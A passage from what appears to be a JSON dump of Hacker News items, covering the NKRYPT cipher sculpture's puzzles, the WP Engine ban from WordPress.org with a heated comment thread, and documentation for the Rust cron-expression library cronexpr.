ZCCFCUEAKAKFSMP YRHUUTMCYSSMPFG TUCIESREQXAICHL LYVBKNNZVBPKNQA EXQSHOSGVZDHDFM HYPHCUDQTMWVNEK NGACBGTSACXEHRE DUUHNQVDATWTIEK ZRFHTOFRUPTKHNP XYNFBBHWPVSSKIN NOHYWLJQZKWRSQO UIEEQKYEMPRQEDM IVSVAPNGKDVPQME XGCIOAVXVIGTPIQ ORDQRJEKWFPVWZP ECYNYRCGWWIFCYX GVLGPLBSJGMIJCX RHYEOHHWTXOAGYS FSDOZGZJGNPTRUA ESTRPYFTJVZQHOP EQLOQRGPHPKEDEI IQHCZYWPJZKAZQA KSKMIPLDRGCWCAD GZCDBB This consists of 515 characters, split into lines mostly of 15 characters which are spaced and offset so they appear like the plane projection of a double helix. The start of each line is a sine wave with a frequency of about 0.75 radians per line, with the ending of each line lagging by a quarter circle. [unsolved] H: labyrinth … ALABYRINTHSTANDSBEHATAWAIT EHTHGUORHTPEOYEROFTSAMGINE ATONEBYONESTUATHEYCREATETH IEFOENOTUBSIDNSNRETTRAMTHG ETWISTSANDTURNSFORPAKALLTH ALABYRINTHSTANDSBEHATAWAIT EHTHGUORHTPEOYEROFTSAMGINE ATONEBYONESTUATHEYCREATETH IEFOENOTUBSIDNSNRETTRAMTHG ETWISTSANDTURNSFORPAKALLTH A labyrinth stands before you and is but one of eight Mark all the twists and turns for patterns they create That one by one step through the enigmas that await [plaintext posted by Glenn McIntosh] H: title N K R Y P T NKRYPT H: PVL Above the ring cipher is another cipher of 26x10 letters, and the letters 'P', 'V', and 'L' are in a larger font. OXPUWAOEKZVCRLUYFMLXTPNATW VGZTCGVGDAAXFDKOCRFRUOKAPW LCMPTFPBTYXRSZKKQUBJAMHYUL MZVSXXZHDLYHOKWWEJUXLXKRZU PPESLBOEKOGRTAYDFOHRHVMPBN DTEZBTYDXNMPXHVNKCIYEMJFVE MNKDIQBOSUFFFWBVDNKHRTLIMZ WRRQUFNNBGKUWNQCHDEFSTZZRQ UIUDPTKGATPSJIFXXGGSNTWJLA BRYVUCSBNPYAVSTTONZFWIUUNW [unsolved] Conjecture, this is perhaps the conclusion of the eight ring ciphers, and may require the information from those other ciphers to decode, for example the labyrinth alignment codes. base code A 10/11 9/11 9/12 13/17 28/29 15/17 11/12 11/12 11/13 20/24 9/13 11/11 7/9.3 11/11 14/17 B 10/10 9/12 11/13 15/17 28/30 17/18 11/12 8/10 14/15 22/24 12/13 11/12 7/10 8/11 14/17 C 10/10 11/12 11/13 14/15 30/30 17/18 12/12 8/10 14/14 19/22 12/12 11/13 7/7 8/8 14/17 D 10/11 9/14 12/13 15/17 28/30 17/17 11/11 8/12 13/15 22/24 9/13 11/11 9.3/10 8/11 14/17 E 10/11 12/14 11/13 15/22 28/30 16/17 11/13 8/10 12/15 22/22 10/13 11/13 9/10 8/8 16/17 F 10/12 12/14 11/12 14/15 28/30 16/17 11/11 8/10 10/15 19/24 9/12 11/13 9/9.3 8/8 14/17 G 11/12 9/12 11/13 15/17 28/30 17/18 11/11 10/12 13/14 19/24 12/13 11/12 7/9.3 8/11 14/17 H 10/12 11/12 11/11 14/17 30/30 16/18 11/12 10/10 10/14 19/24 12/12 12/13 7/9 8/11 14/14 These appear to represent repeat counts from 15 autosomal-STR loci of DNA, used as forensic 'fingerprints' for human individuals. These are loci measured by systems such as the Powerplex 16 HS. The order is alphabetic (CSF1PO, D13S317, D16S539, D18S51, D21S11, D3S1358, D5S818, D7S820, D8S1179, FGA, PENTAD, PENTAE, TH01, TPOX, VWA). The genotypes here are similar, and probably from a European/Asian population group. [unsolved] Conjecture, is that these are genetic relationships. If so, the possible filial connections are A-D, B-C, B-D, B-E, B-H, C-H, D-E, D-F, D-G, F-H, G-H. If we require both parents, then the possible parental connections are AE-D, HD-F, HD-G, and either HD-B or HB-C. opening day tweet On the opening day, Senator Kate Lundy tweeted a message which had been encoded using the rotor cipher. A photograph taken then shows a rotor setting of CYWE. HDXJNFJXZJEZTHDBMMWQZJTUROGOUCRFRUOHHZMLQPMBKUYKKCRNKDLNDLXJNIDIHJIHQKWDPCI With a rotor setting of \"SWYQ\" (which is rot13 of \"FJLD\"), the last sixteen letters decode to \"thecentenarycode\". ???????????????????????????????????????????????????????????thecentenarycode [unsolved]",
    "commentLink": "https://news.ycombinator.com/item?id=41658766",
    "commentBody": "NKRYPT Sculpture (meme.net.au)156 points by goles 4 hours agohidepastfavorite6 comments pmayrgundter 2 hours agoquick observation.. The layout of the columns is a \"constellation\" that looks like the little dipper... same basic layout, number of stars, curve of handle If so, the H column is the odd one out, and if you look for an interesting star around there, I find a syzygy of k Cephius & HIP 99169, tho distance away isn't quite right. Or maybe HIP 92738 Also note that stars come up in the symbology for F column, which is speculated to encode spectra, maybe from stars reply gigonaut 2 hours agoparentNot sure if this is relevant or not, but it might be worth adding that the little dipper is not visible from the southern hemisphere. reply lisper 1 hour agorootparentGiven that the sculpture is in Australia, that seems like a plausible clue to me. reply thebeardisred 1 hour agoprevMy introduction to most of these ciphers has been through DEF CON puzzles over the last 20 years. This is a fun way of seeing them presented to the world. reply TheRealPomax 3 hours agoprevI'm reminded of https://en.wikipedia.org/wiki/Kryptos reply colinprince 1 hour agoprev [–] see also https://www.dkrypt.org/ reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "NKRYPT is a cryptography installation in Canberra, Australia, featuring eight stainless steel pillars with various ciphers, designed by Stuart Kohlhagen and installed in March 2013 for Canberra's Centenary.",
      "The installation includes a range of ciphers such as Caesar, semaphore, scytale, binary, and more, inviting the public to decipher them, with some codes celebrating Canberra's Centenary offering prizes.",
      "Some ciphers have been solved, revealing messages about historical figures and cryptographic methods, while others remain unsolved, adding an ongoing challenge for enthusiasts."
    ],
    "commentSummary": [
      "The NKRYPT sculpture in Australia has sparked interest due to its column layout resembling the Little Dipper constellation, with potential encoded star spectra.",
      "Observers note that the Little Dipper is not visible from the southern hemisphere, adding a layer of complexity to the puzzle.",
      "The sculpture has drawn comparisons to famous cryptographic art like Kryptos and has engaged the puzzle-solving community, including those familiar with DEF CON challenges."
    ],
    "points": 155,
    "commentCount": 6,
    "retryCount": 0,
    "time": 1727360676
  },
  {
    "id": 41652760,
    "title": "WP Engine is banned from WordPress.org",
    "originLink": "https://wordpress.org/news/2024/09/wp-engine-banned/",
    "originBody": "September 25, 2024 By Matt Mullenweg in Community, Development, General, Security, Updates WP Engine is banned from WordPress.org Any WP Engine customers having trouble with their sites should contact WP Engine support and ask them to fix it. WP Engine needs a trademark license, they don’t have one. I won’t bore you with the story of how WP Engine broke thousands of customer sites yesterday in their haphazard attempt to block our attempts to inform the wider WordPress community regarding their disabling and locking down a WordPress core feature in order to extract profit. What I will tell you is that, pending their legal claims and litigation against WordPress.org, WP Engine no longer has free access to WordPress.org’s resources. WP Engine wants to control your WordPress experience, they need to run their own user login system, update servers, plugin directory, theme directory, pattern directory, block directory, translations, photo directory, job board, meetups, conferences, bug tracker, forums, Slack, Ping-o-matic, and showcase. Their servers can no longer access our servers for free. The reason WordPress sites don’t get hacked as much anymore is we work with hosts to block vulnerabilities at the network layer, WP Engine will need to replicate that security research on their own. Why should WordPress.org provide these services to WP Engine for free, given their attacks on us? WP Engine is free to offer their hacked up, bastardized simulacra of WordPress’s GPL code to their customers, and they can experience WordPress as WP Engine envisions it, with them getting all of the profits and providing all of the services. If you want to experience WordPress, use any other host in the world besides WP Engine. WP Engine is not WordPress. Share this: Twitter Facebook Email",
    "commentLink": "https://news.ycombinator.com/item?id=41652760",
    "commentBody": "WP Engine is banned from WordPress.org (wordpress.org)148 points by lambda-dev 20 hours agohidepastfavorite53 comments cyral 19 hours agoThe exaggerations in the post are crazy, that WP engine \"broke\" websites by disabling the news in the admin dashboard? If I recall that is like a one line code change. They disabled it because Matt published a disparaging post about WP Engine, knowing that it would show up in the admin dashboards of every wordpress install. That post was about them not being \"real\" wordpress because they disable post revisions (which apparently they have done for a decade). His own competing managed WordPress service (confusingly named Wordpress.com) disables features as well, unless you upgrade to a higher plan. What a mess. This should have continued to be handled by lawyers and not by using the foundation to disable updates for thousands of sites. What happens to vulnerabilities as a result of this move? reply type0 17 hours agoparent> His own competing managed WordPress service (confusingly named Wordpress.com) disables features as well They are allowed to do this because Automattic owns the trademark along with WordPress Foundation reply cyral 17 hours agorootparentCorrect, but his argument that WP Engine is confusing customers is strange when he runs the most confusing part about WordPress (.com vs .org). This tells me it is not really about reducing confusion, but him wanting to get paid because WP Engine is not contributing. Keep in mind Automattic was an early investor in WP Engine and they, along with countless other hosting and plugin businesses, have been using the WordPress name. Failing to go after any of them for over a decade can make it difficult to enforce the trademark. However, this may be the most valid legal avenue he has. Something I also find interesting is the WordPress foundation trademark terms were changed a couple days ago. Using \"WP\" was okay, to now calling out \"WP Engine\" specifically as being confusing: https://www.diffchecker.com/tJ29tGIn/ reply sureIy 13 hours agorootparent> Using \"WP\" was okay, to now calling out \"WP Engine\" specifically as being confusing That’s the most childish thing out of this whole debacle. It is extremely clear that you cannot just change your terms 10 years after a company has been created in order to exclude it. Any judge would throw that case out of the window in 10 seconds. reply stogot 12 hours agorootparentYou’re conflating two posts. He didn’t change any terms until they took legal action against them. If my neighbor came over to my house everyday and made a sand which, then sued me… then I’d lock the front door Though I don’t know how much merit his original post had. reply sureIy 11 hours agorootparentNo this is more like city hall saying “you can’t build here” 10 years after watching you build. Too late, the house was built and you implicitly gave permission for it. reply oliwarner 11 hours agorootparentprevHas anyone actually been confused about the hosted service and the software? I struggle with this argument because so much SaaS follows this model with self-hosted community editions. It's not like .com is trying to sell you a proprietary self-hosted version. reply JimDabell 3 hours agorootparentYes, WordPress.org and WordPress.com are mixed up all the time, so much so that /r/WordPress on Reddit has had a sticky for years linking to a page on WordPress.org that explains the difference. According to WordPress.org itself: > People are often confused about the differences between WordPress.com and WordPress.org because they sure sound similar. This workshop highlights the key differences between .Org and .Com. — https://learn.wordpress.org/tutorial/what-is-the-difference-... reply cyral 4 hours agorootparentprevSo many people get confused between .com and .org. It’s a sticky on the WordPress reddit and less technical people definitely think going to Wordpress.com to sign in is somehow their install’s login. Which makes his point about people being confused about WP Engine so silly when he runs the most confusing part of WordPress. reply Kye 7 hours agorootparentprevThe .com and .org user forums get a steady stream of posts from people who mixed them up. reply amanzi 16 hours agoprevHe's lost his mind! Customising the admin dashboard has been something WordPress multisite hosts have been doing for 15+ years! There are tons of plugins on WordPress.org that provide this specific feature. And if you don't want a plugin, you can develop it yourself using supported WordPress-provided dashboard hooks: https://developer.wordpress.org/reference/hooks/wp_dashboard... Same with post revisions - you can download plugins to customise this, or you can do it yourself with WordPress-supported functionality: https://wordpress.org/documentation/article/revisions/ Where is the contract that WP Engine signed, that says they must display posts from their competitors calling them a cancer in their customer's websites? I'm really lost for words - I have no explanation for what's going on in Matt's head. reply healsdata 13 hours agoparent> Where is the contract that WP Engine signed, that says they must display posts from their competitors calling them a cancer in their customer's websites? There isn't one. Just like there isn't one that says they can download plugins et al from their competitors' website. This is open source. They're free to fork WordPress, set up a competing app store, etc. reply amanzi 12 hours agorootparentWordPress.org is not a competitor to WP Engine. Despite Matt claiming that WP Engine is a \"cancer\", WP Engine have supported WordPress for a long time, both through financial contributions and code contributions - even sponsoring the same WordCampUS conference where Matt launched his attack. reply KomoD 5 hours agorootparentprevCompetitor? How is wordpress.org a competitor? reply LegionMammal978 18 hours agoprev> What I will tell you is that, pending their legal claims and litigation against WordPress.org, WP Engine no longer has free access to WordPress.org’s resources. Since when has WP Engine been threatening litigation against WordPress.org or the WordPress Foundation? Their C&D letter [0] was only addressed to Automattic Inc. Perhaps it has to do with the claims of trademark infringement in the counter-C&D letter [1]? But that letter was sent only in the name of Automattic Inc. and WooCommerce, Inc., despite the WordPress Foundation being the ultimate owner of the trademark. [0] https://wpengine.com/wp-content/uploads/2024/09/Cease-and-De... [1] https://automattic.com/2024/wp-engine-cease-and-desist.pdf reply LegionMammal978 1 hour agoparentAn update from this morning: WP Engine have said that they hadn't filed any litigation against WordPress.org [0]. [0] https://x.com/wpengine/status/1839246341660119287 reply slouch 18 hours agoparentprevWe don't have evidence there is anyone else in the Foundation with any power. WordPress.org is owned personally by Matt. reply LegionMammal978 18 hours agorootparentYeah, the practical situation there would seem pretty clear. I'm just wondering what theory Mullenweg is trying to express here in support of this action. reply slouch 18 hours agorootparenthttps://news.ycombinator.com/item?id=41641864 reply LegionMammal978 17 hours agorootparentOf course the claim of trademark infringement has some plausible iota of basis to it. But I question whether WP Engine is really pursuing legal claims against WordPress.org as Mullenweg says they are, which would be a surprise to me. (Well, except for new claims as a consequence of this action.) reply sureIy 13 hours agorootparentprevHe’s just trying to cause as much damage to WP Engine as possible and I guarantee that he will forced to pay for this tomfoolery by a judge. reply appendix-rock 19 hours agoprevI have no horse in this race, but this blog post seems like the hot-blooded vitriolic ramblings of a crazy person that can’t mentally separate their commercial and open-source endeavours. The outrage definitely feels at least somewhat ‘put on’ for the sake of publicity. Who cares!? reply janice1999 19 hours agoparentNo kidding. I have never seen a news article from a large serious organisation that had the word \"bastardized\" in it before. reply talldayo 19 hours agoparentprevYeah - even without much context this blog post reads like an embarrassing mess. I hope the author thinks it was worth tarnishing the Wordpress brand so they could enjoy their king-for-a-day meltdown. reply mikeyinternews 18 hours agorootparentThe author is Matt Mullenweg, co-founder of WordPress! reply neya 4 hours agoprevThis sets a very dangerous precedent - that this software \"sold\" as free and open source, free as in free beer and free as in speech is not really free at all. This only exposed the fact that the plugin repository was all along centrally managed and Wordpress has never been truly free all along. That if you tick off the overlords, then you can be banned from this critical central repository of plugins. All this for someone customising the way their admin panel looks like and making some changes they had the right to, in the first place. I think someone should use this as an opportunity to build a better Wordpress clone. You know what, I'm going to do it. I don't care about adoption and market share. I care about freedom. This is not freedom. It reminds me of the WURFL saga that happened a few decades ago for the exact reason. And you know what? Even for such a large, mature product, it is full of security issues, bug and has absolutely poor code quality and poor development experience. Did I mention it doesn't even scale without throwing tons of money at it? I will update you guys soon. /endrant Thanks. reply rob 19 hours agoprevCrazy Matt woke up one day at 40 years old and just decided to ruin his entire reputation and company that he spent over a decade building up. reply chuckadams 19 hours agoparentHis reputation wasn't exactly sterling before: https://pearsonified.com/truth-about-thesis-com reply computerliker 19 hours agorootparentEarlier this year, Matt chased a popular Tumblr user he banned under Tumblr's weirdly transphobic TOS to Twitter to harass her publicly. He immediately took a \"sabbatical\" from Tumblr after this. https://techcrunch.com/2024/02/22/tumblr-ceo-publicly-spars-... reply MattPearce 17 hours agorootparentPlease point out where Tumblr’s TOS is “weirdly transphobic”. Users who post pornography are banned regardless of gender identity. Matt’s sabbatical from Automattic was already underway when this incident occurred. Disclaimer: I work for Automattic but I am speaking personally. reply gulbanana 9 hours agorootparentare all of you called Matt over there? reply KTibow 14 hours agorootparentprevOdd that user got singled out, it seems pretty average for Tumblr reply jwitthuhn 18 hours agoprevLooking forward to them taking a similar action against Wordpress.com for upselling access to the core wordpress feature of plugins. reply chuckadams 19 hours agoprevThis is not what ceasing and desisting looks like. If Automattic doesn’t fire MM within a week then we know who wears the pants there. A fork backed by real money is starting to look more likely. reply stefanos82 19 hours agoparentThe fork has a name; it's called ClassicPress! reply elaus 13 hours agorootparent> A fork of WordPress without the block editor (Gutenberg) That seems to be a major technical (and UX) difference that has nothing to do with the leadership of Wordpress.org reply amanzi 16 hours agorootparentprevI've been casually keeping track of this - I wasn't sure that it would last. But perhaps it's time for me to take another look at this. reply Kye 18 hours agoprevWordPress supports ActivityPub now, so this is also a spat between two massive AP platforms with apocalyptic potential. Someone needs to get follower migration from WordPress to anything else on the AP fediverse done quick. It's inter-instance conflict at incredible scale. reply CharlesW 15 hours agoparentWhatever happens, WordPress isn't going anywhere. At worst, someone will fork and rebrand it, just like Mike and Matt forked and rebranded b2/cafelog to create WordPress. (There are already successful forks like ClassicPress.) reply sureIy 13 hours agorootparent> ClassicPress Never heard of it before, but it constantly surprises me how much effort people are willing to put in just to keep “the old version” of something. reply bravetraveler 11 hours agorootparentI think it says a bit about how dubious 'new and improved' can be Security updates, features? Perhaps yay. Redesign, boo. I already use the thing. reply sureIy 10 hours agorootparentYeah, exactly. Do you really want to put that much effort because “redesign boo”? Makes no sense. Put the effort learning the new UI and move on. Every single “bring the old X back” project ends badly, you’re just extending your own pain by using those projects because they’ll slowly fall out of date. The only way to successfully “bring the old X back” is to convince the original vendor, like it happened for the Metro UI in Windows 8. reply chuckadams 2 hours agorootparentIf it were just a matter of a new admin UI, that would be one thing. A quick peek under the covers reveals how howling-at-the-moon-insane the Gutenberg block format is, how brittle it is when working with filters and other low-level things, and that's been the real source of pushback from developers. TBH I kind of liked Metro back when it was used for XP Media Center. Win8 just did a crap job at integrating it with the rest of the system (and arguably repeating the same crap job with win10/11) reply bravetraveler 6 hours agorootparentprevYou've changed my mind on this a bit! I was generally more in the mindset of: \"sure, maintain the old copy\". Granted, Wordpress isn't the best choice for this. Vulnerabilities abound. It's funny we still agree, coming from different approaches :) To your point, it doesn't make much sense to fork and actually maintain the code. I more meant the installation/deployment. I'm not that afraid with things like SELinux policies and network boundaries in place. One could learn the new thing, find something more suitable, or run the old thing until the wheels fall off. We're spoiled for choice! Creating more fragmentation/choice extends the challenge. We see this with Linux distributions. Outside of like four root distributions, we have N derivatives re-packaging for slightly different themes and configs. Given enough time and caffeine I could replace the entire ISO ecosystem with YML and Linux from Scratch... but I use something more traditional because I value my time/effort. reply bubblesnort 11 hours agoprevSomeone please fork WordPress to e.g. WebPublish and sed -i 's/WordPress/WebPublish/' the whole thing and let both of these companies duke it out while we can continue in peace. Much good could come from this. reply nailer 11 hours agoparentWon’t solve problems. Web Publish still needs to run all the infrastructure that Wordpress dot org does. reply bubblesnort 10 hours agorootparentNot really. WordPress continues to function in airplane mode with the airplane mode plugin. And besides, you have to start somewhere. There could be a bunch of independant plugin and theme registries just like there are with Minecraft mods and resource packs. GitHub already serves this purpose for me with WordPress. reply lambda-dev 19 hours agoprev> WP Engine wants to control your WordPress experience, they need to run their own user login system, update servers, plugin directory, theme directory, pattern directory, block directory, translations, photo directory, job board, meetups, conferences, bug tracker, forums, Slack, Ping-o-matic, and showcase. Their servers can no longer access our servers for free. Sounds a lot like Android and Google: you can have the source, but good luck without our services! reply AlienRobot 19 hours agoprevWhile I agree with Matt's thoughts on Wordpress I don't like this sort of public shaming. If you post this kind of thing, it burns bridges that you can't mend later. How can the two organizations reconciliate after this? Wordpress wants WP Engine to contribute to the source code because it makes money off Wordpress and uses its servers. I think this is very reasonable. I'm pretty sure WP Engine could patch Wordpress to use its own infrastructure, so this isn't a really as much of a security risk as people claim. Distros have been doing this since forever. This isn't much different from a Youtuber getting banned from Youtube. If you build your entire business upon a single point of failure, this kind of thing can happen. But I'd rather there was a path forward for them. Right now it's either 1) Matt gets fired as CEO so WP Engine can continue leeching off Wordpress, or 2) WP Engine has to support its own weight fragmenting the Wordpress ecosystem. Although I use Wordpress I have no idea what people think Wordpress is supposed to be. I love Gutenberg, but everyone hates it, and some hate it because they compare it to site builders instead of WYSIWYG HTML editors. The point is that Wordpress is used by so many websites, both big and small, as a site builder, blogging platform, news platform, and even as a database and shopping platform sometimes, that it's impossible to say how it's supposed to be used. I think if Wordpress.org makes it clear what are the costs of WP Engine to the project compared to their contributions, it will be easier for people who use Wordpress to understand their side because numbers are neutral. reply kevmarsden 18 hours agoparent> I'm pretty sure WP Engine could patch Wordpress to use its own infrastructure, so this isn't a really as much of a security risk as people claim. Patching core WordPress is straightforward, but there's also tens of the thousands of plugins and themes on WordPress.org. Until WP Engine can create a mirror of the plugin and theme repos, there will be security risks. reply porker 11 hours agorootparentMirroring is not difficult, I've done it in order to perform code analysis on plugins at scale. reply martpie 10 hours agorootparentWell, it definitely becomes harder when you cannot (officially) access any of the WP infra, including themes and plugins. reply 7ero 12 hours agoprev [–] but wordpress.org was built on wp engine reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "WP Engine has been banned from WordPress.org due to lacking a trademark license and disrupting communication about their disabling of a WordPress core feature for profit.",
      "As a result of their legal actions against WordPress.org, WP Engine no longer has free access to WordPress.org resources and must manage their own systems and security.",
      "WordPress.org advises users seeking a true WordPress experience to use any other host, as WP Engine is not considered part of the WordPress community."
    ],
    "commentSummary": [
      "WP Engine has been banned from WordPress.org after disabling the news feature in the admin dashboard following a critical post by Matt Mullenweg, WordPress co-founder.",
      "Mullenweg accused WP Engine of confusing customers and not contributing to WordPress, sparking debates about central control and open-source freedom.",
      "Critics highlight the irony in Mullenweg's actions, given the existing confusion between WordPress.com and WordPress.org, and some suggest forking WordPress to prevent similar conflicts."
    ],
    "points": 148,
    "commentCount": 53,
    "retryCount": 0,
    "time": 1727305166
  },
  {
    "id": 41654723,
    "title": "Cronexpr, a Rust library to parse and iter crontab expression",
    "originLink": "https://docs.rs/cronexpr/latest/cronexpr/",
    "originBody": "Crate cronexprCopy item path Settings Help Summarysource Expand description cronexpr is a library to parse and drive the crontab expression. Here is a quick example that shows how to parse a cron expression and drive it with a timestamp: use std::str::FromStr; use cronexpr::MakeTimestamp; let crontab = cronexpr::parse_crontab(\"2 4 * * * Asia/Shanghai\").unwrap(); // case 0. match timestamp assert!(crontab.matches(\"2024-09-24T04:02:00+08:00\").unwrap()); assert!(!crontab.matches(\"2024-09-24T04:01:00+08:00\").unwrap()); // case 1. find next timestamp with timezone assert_eq!( crontab .find_next(\"2024-09-24T10:06:52+08:00\") .unwrap() .to_string(), \"2024-09-25T04:02:00+08:00[Asia/Shanghai]\" ); // case 2. iter over next timestamps without upper bound let iter = crontab.iter_after(\"2024-09-24T10:06:52+08:00\").unwrap(); assert_eq!( iter.take(5) .map(|ts| ts.map(|ts| ts.to_string())) .collect::, cronexpr::Error>>() .unwrap(), vec![ \"2024-09-25T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-26T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-27T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-28T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-29T04:02:00+08:00[Asia/Shanghai]\", ] ); // case 3. iter over next timestamps with upper bound let iter = crontab.iter_after(\"2024-09-24T10:06:52+08:00\").unwrap(); let end = MakeTimestamp::from_str(\"2024-10-01T00:00:00+08:00\").unwrap(); assert_eq!( iter.take_while(|ts| ts.as_ref().map(|ts| ts.timestamp() , cronexpr::Error>>() .unwrap(), vec![ \"2024-09-25T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-26T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-27T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-28T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-29T04:02:00+08:00[Asia/Shanghai]\", \"2024-09-30T04:02:00+08:00[Asia/Shanghai]\", ] ); For more complex and edge cases, read the Edge cases section. §Syntax overview This crates supports all the syntax of standard crontab and most of the non-standard extensions. The mainly difference is that this crate always requires the timezone to be specified in the crontab expression. This is because the timezone is necessary to determine the next timestamp. * * * * *┬ ┬ ┬ ┬ ┬ ────┬──── │ │ │ │ ││ │ │ │ │ └──── timezone UTC, Asia/Shanghai, and so on │ │ │ │ └───────────── day of week 0-7, SUN-SAT (0 or 7 is Sunday) │ │ │ └────────────────── month 1-12, JAN-DEC │ │ └─────────────────────── day of month 1-31 │ └──────────────────────────── hour 0-23 └───────────────────────────────── minute 0-59 This crate also supports the following non-standard extensions: Last day of month (L) Nearest weekday (1W, 15W, etc.) Last day of week (5L) Nth day of week (5#3) §Timezone Timezone is parsed internally by jiff::tz::TimeZone::get. It supports all the timezone names in the IANA Time Zone Database. See the list of time zones. §Single value Every field (except timezone) can be a single value. For minutes, it can be from 0 to 59. For hours, it can be from 0 to 23. For days of month, it can be from 1 to 31. For months, it can be 1-12. Alternatively, it can be the first three letters of the English name of the month (case-insensitive), such as JAN, Feb, etc. JAN will be mapped to 1, Feb will be mapped to 2, and so on. For days of week, it can be 0-7, where both 0 and 7 represent Sunday. Alternatively, it can be the first three letters of the English name of the day (case-insensitive), such as SUN, Mon, etc. SUN will be mapped to 0, Mon will be mapped to 1, and so on. Days of week and days of month support extra syntax, read their dedicated sections below. §Asterisk Asterisks (also known as wildcard) represents “all”. For example, using * * * * * will run every minute. Using * * * * 1 will run every minute only on Monday. §Range Hyphen (-) defines ranges. For example, JAN-JUN indicates every month from January to June, inclusive. Range bound can be any valid single value, but the left bound must be less than or equal to the right bound. §Step In Vixie’s cron, slash (/) can be combined with ranges to specify step values. For example, */10 in the minutes field indicates every 10 minutes (see note below about frequencies). It is shorthand for the more verbose POSIX form 00,10,20,30,40,50. Note that frequencies in general cannot be expressed; only step values which evenly divide their range express accurate frequencies (for minutes and seconds, that’s /2, /3, /4, /5, /6, /10, /12, /15, /20 and /30 because 60 is evenly divisible by those numbers; for hours, that’s /2, /3, /4, /6, /8 and /12); all other possible “steps” and all other fields yield inconsistent “short” periods at the end of the time-unit before it “resets” to the next minute, hour, or day; for example, entering */5 for the day field sometimes executes after 1, 2, or 3 days, depending on the month and leap year; this is because cron is stateless (it does not remember the time of the last execution nor count the difference between it and now, required for accurate frequency counting—instead, cron is a mere pattern-matcher). This crate requires the step value to be in the range of the field and not zero. The range to be stepped can be any valid single value, asterisk, or range. When it’s a single value v, it’s expanded to a range v-. For example, 15/XX is the same as a Vixie’s cron schedule of 15-59/10 in the minutes section. Similarly, you can remove the extra -23 from 0-23/XX, -31 from 1-31/XX, and -12 from 1-12/XX for hours, days, and months; respectively. Note that this is to support the existing widely adopted syntax, users are encouraged to use the more explicit form. §List Commas (,) are used to separate items of a list. For example, using MON,WED,FRI in the 5th field (day of week) means Mondays, Wednesdays and Fridays. The list can contain any valid single value, asterisk, range, or step. For days of week and days of month, it can also contain extra syntax, read their dedicated sections below. List items are parsed delimited by commas. This takes the highest precedence in the parsing. Thus, 1-10,40-50/2 is parsed as 1,2,3,4,5,6,7,8,9,10,40,42,44,46,48,50. §Day of month extension All the extensions below can be specified only alone or as a single item of a list, not in a range or a step. §Last day of month (L) The L character is allowed for the day-of-month field. This character specifies the last day of the month. §Nearest weekday (1W, 15W, etc.) The W character is allowed for the day-of-month field. This character is used to specify the weekday (Monday-Friday) nearest the given day. As an example, if 15W is specified as the value for the day-of-month field, the meaning is: “the nearest weekday to the 15th of the month.” So, if the 15th is a Saturday, the trigger fires on Friday the 14th. If the 15th is a Sunday, the trigger fires on Monday the 16th. If the 15th is a Tuesday, then it fires on Tuesday the 15th. However, if 1W is specified as the value for day-of-month, and the 1st is a Saturday, the trigger fires on Monday the 3rd, as it does not ‘jump’ over the boundary of a month’s days. §Day of week extension All the extensions below can be specified only alone or as a single item of a list, not in a range or a step. §Last day of week (5L) The L character is allowed for the day-of-week field. This character specifies constructs such as “the last Friday” (5L) of a given month. §Nth day of week (5#3) The # character is allowed for the day-of-week field, and must be followed by a number between one and five. It allows specifying constructs such as “the second Friday” of a given month. For example, entering 5#3 in the day-of-week field corresponds to the third Friday of every month. §Edge cases §The Vixie’s cron bug became the de-facto standard Read the article for more details. Typically, 0 12 *,10 * 2 is not equal to 0 12 10,* * 2. let crontab1 = cronexpr::parse_crontab(\"0 12 *,10 * 2 UTC\").unwrap(); let crontab2 = cronexpr::parse_crontab(\"0 12 10,* * 2 UTC\").unwrap(); let ts = \"2024-09-24T13:06:52Z\"; assert_ne!( // \"2024-10-01T12:00:00+00:00[UTC]\" crontab1.find_next(ts).unwrap().to_string(), // \"2024-09-25T12:00:00+00:00[UTC]\" crontab2.find_next(ts).unwrap().to_string() ); This crate implements the Vixie’s cron behavior. That is, Check if either the day of month or the day of week starts with asterisk (*). If so, match these two fields in interaction. If not, match these two fields in union. So, explain the example above: The first one’s (0 12 *,10 * 2 UTC) day-of-month starts with an asterisk so cron uses intersect. The schedule fires only on Tuesdays because all-days-of-month ∩ Tuesday = Tuesday. It is the same schedule as 0 12 * * 2 UTC. The second one’s (0 12 10,* * 2 UTC) day-of-month has an asterisk in the day-of-month field, but not as the first character. So cron uses union. The schedule fires every day because all-days-of-month ∪ Tuesday = all-days-of-month. It is therefore the same as 0 12 * * * UTC. Also, 0 12 1-31 * 2 is not equal to 0 12 * * 2. let crontab1 = cronexpr::parse_crontab(\"0 12 1-31 * 2 UTC\").unwrap(); let crontab2 = cronexpr::parse_crontab(\"0 12 * * 2 UTC\").unwrap(); let ts = \"2024-09-24T13:06:52Z\"; assert_ne!( // \"2024-09-25T12:00:00+00:00[UTC]\" crontab1.find_next(ts).unwrap().to_string(), // \"2024-10-01T12:00:00+00:00[UTC]\" crontab2.find_next(ts).unwrap().to_string() ); The first one fires every day (same as 0 12 1-31 * * UTC or as 0 12 * * * UTC), and the second schedule fires only on Tuesdays. This bug is most likely to affect you when using step values. Quick reminder on step values: 0-10/2 means every minute value from zero through ten (same as the list 0,2,4,6,8,10), and */3 means every third value. By using an asterisk with a step value for day-of-month or day-of-week we put cron into the intersect mode producing unexpected results. Most of the time, we choose to use the wildcard to make the cron more legible. However, by now you understand why 0 12 */2 * 0,6 does not run on every uneven day of the month plus on Saturday and Sundays. Instead, due to this bug, it only runs if today is uneven and is also on a weekend. To accomplish the former behaviour, you have to rewrite the schedule as 0 12 1-31/2 * 0,6. fn next(iter: &mut cronexpr::CronTimesIter) -> String { iter.next().unwrap().unwrap().to_string() } let crontab1 = cronexpr::parse_crontab(\"0 12 */2 * 0,6 UTC\").unwrap(); let mut iter1 = crontab1.iter_after(\"2024-09-24T13:06:52Z\").unwrap(); assert_eq!(next(&mut iter1), \"2024-09-29T12:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter1), \"2024-10-05T12:00:00+00:00[UTC]\"); assert_eq!(next(&mut iter1), 